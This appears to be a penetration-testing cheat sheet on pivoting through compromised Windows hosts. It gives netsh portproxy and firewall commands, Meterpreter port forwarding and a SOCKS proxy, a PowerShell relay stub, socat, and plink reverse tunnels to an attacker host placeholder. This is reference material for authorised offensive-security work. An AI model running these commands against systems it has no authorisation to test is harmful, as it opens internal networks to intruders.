---
title: Windows Port Forward & SOCKS
category: pivoting
description: netsh, PowerShell, plink, and meterpreter portfwd.
tags: [pivot, windows, netsh]
os: [windows]
order: 30
---

## netsh portproxy (admin)

```cmd
:: Listen 0.0.0.0:8888 on victim, forward to internal:80
netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=internal
netsh interface portproxy show all
:: Open firewall
netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=8888
:: Cleanup
netsh interface portproxy delete v4tov4 listenport=8888 listenaddress=0.0.0.0
```

## Meterpreter portfwd

```text
portfwd add -l 8888 -p 80  -r internal       # local → remote
portfwd add -R -l 4444 -p 4444 -L {{LHOST}}  # reverse
portfwd list
route add 10.0.0.0/24 1
use auxiliary/server/socks_proxy ; set VERSION 5 ; run
```

## PowerShell TCP relay

```powershell
$listener = [System.Net.Sockets.TcpListener]8888
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $upstream = New-Object Net.Sockets.TcpClient("internal", 80)
    # bidirectional copy ... (use Invoke-PortForward script from PowerSploit/Posh-SecMod)
}
```

Easier: use `Invoke-PortFwd` from PowerSploit or the `socat`-for-windows binary.

## socat (if you can drop the binary)

```bash
socat TCP-LISTEN:8888,fork,reuseaddr TCP:internal:80
```

## Plink (PuTTY's CLI) — outbound SSH from Windows

```cmd
plink.exe -ssh -N -R 1080 -l {{USER}} -pw 'pass' {{LHOST}}
plink.exe -ssh -N -L 0.0.0.0:8888:internal:80 -l {{USER}} -pw 'pass' {{LHOST}}
```
